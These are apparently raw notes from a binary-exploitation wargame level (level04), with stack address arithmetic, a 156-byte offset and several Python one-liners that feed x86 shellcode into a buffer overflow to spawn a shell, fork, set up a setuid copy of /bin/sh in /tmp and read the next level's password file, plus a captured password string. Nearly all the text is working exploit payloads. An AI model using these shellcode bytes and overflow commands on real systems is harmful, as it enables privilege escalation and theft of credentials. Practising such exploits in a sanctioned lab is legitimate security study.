

set follow-fork-mode child

\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80

'\xeb\x0d\x5f\x31\xc0\x50\x89\xe2\x52\x57\x54\xb0\x3b\xcd\x80\xe8\xee\xff\xff\xff/bin/sh'

0xffffd670

/home/users/level04/level04 <<< $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80\x08\x04\xa0\x47' + '\xFF'*(156 - 24 - 4) + '\x70\xd6\xff\xff')")

27 octets:
/home/users/level04/level04 <<< $(python -c "print('\xeb\x0d\x5f\x31\xc0\x50\x89\xe2\x52\x57\x54\xb0\x3b\xcd\x80\xe8\xee\xff\xff\xff/bin/sh' + '\xFF'*(156 - 27 - 4) + '\x70\xd6\xff\xff')")


080486A0

/home/users/level04/level04 <<< $(python -c "print('\xeb\x0d\x5f\x31\xc0\x50\x89\xe2\x52\x57\x54\xb0\x3b\xcd\x80\xe8\xee\xff\xff\xff/bin/sh' + '\xFF'*(156 - 27 - 4) + '\xa0\x86\x04\x08')")

ret adress
0xf7e45513


stack tab start
0xffffd670

stck ret
0xffffd70c

0xffffd70c - 0xffffd670 = 156



return address of main		: 0xf7e45513

address of array 			: 0xffffd670 = '\xff\xff\xd6\x70'[::-1]
address of return address	: 0xffffd70c

'\x31\xc0\x40\x89\xc3\xcd\x80'


\x31\xc0\x40\xcd\x80

/home/users/level04/level04 <<< $(python -c "print('\x31\xc0\x40\xcd\x80' + '\xFF'*(156 - 5) + '\xff\xff\xdd\xa0'[::-1])")

<<< $(python -c "print(c + '\xFF'*(156 - 27 - 4 + 4) + '\xa0\x86\x04\x08')")

<<< $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + '\xFF'*(156 - 24) + '\xff\xff\xd6\x70'[::-1])")

<<< $(echo $(cat /tmp/shdist)$(python -c "print('\xFF'*(176 - 98) + '\xff\xff\xd6\x70'[::-1])"))


 /home/users/level04/level04 <<< $(python -c "print('\x29\xc0\xb0\002̀\x85\xc0u\002\xeb\005)\xc0@̀)\xc0)\xdb)ɰF̀\xeb*^\x89v2\x8d^\b\x89^6\x8d^\v\x89^:)\xc0\x88F\a\x88F\n\x88F1\x89F>\x87\xf3\xb0\v\x8dK2\x8dS>̀\xe8\xd1\xff\xff\xff/bin/sh -c cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh' + '\xFF'*(176 - 24 - 4) + '\xff\xff\xd6\x70'[::-1])")
Give me some shellcode, k

ret adress with nop env = 0xffffde40 = '\xff\xff\xde\x40'[::-1]

adress tab with no env = 0xffffdda0 = '\xff\xff\xdd\xa0'[::-1]

echo $(echo $(unset $(env | cut -d= -f1); (/bin/echo $(/usr/bin/python -c "print('\xeb\x0d\x5f\x31\xc0\x50\x89\xe2\x52\x57\x54\xb0\x3b\xcd\x80\xe8\xee\xff\xff\xff/bin/sh' + '\xFF'*(156 - 27) + '\xff\xff\xdd\xa0'[::-1])"); /bin/echo 'cat /home/users/level05/.pass') | /home/users/level04/level04 ))

echo $(echo $(unset $(env | cut -d= -f1); (/bin/echo $(/usr/bin/python -c "print('\xFF'*156 + '\xff\xff\xde\x40'[::-1] + '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')")) | /home/users/level04/level04 ))

++++++++++++++++++++++++++++++++++++

echo $(echo $(unset $(env | cut -d= -f1); (/usr/bin/python -c "print('\xFF'*156 + '\xff\xff\xde\x40'[::-1] + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')" ; /bin/echo '/bin/cat /home/users/level05/.pass') | /home/users/level04/level04 ))

++++++++++++++++++++++++++++++++++++


# FORK

'\x31\xc0\x50\xb0\x02\xcd\x80'

echo $(echo $(unset $(env | cut -d= -f1); (/usr/bin/python -c "print('\xFF'*156 + '\xff\xff\xde\x40'[::-1] + '\x31\xc0\x50\xb0\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')" ; /bin/echo '/bin/cat /home/users/level05/.pass') | /home/users/level04/level04 ))
no exec() for you 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN


commande avant :
echo $(echo $(unset $(env | cut -d= -f1); (/usr/bin/python -c "print('\x31\xc0\x50\xb0\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\xFF'*(156 - 31) + '\xff\xff\xdd\xa0'[::-1])" ; /bin/echo '/bin/cat /home/users/level05/.pass') | /home/users/level04/level04 ))

no exec() for you 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
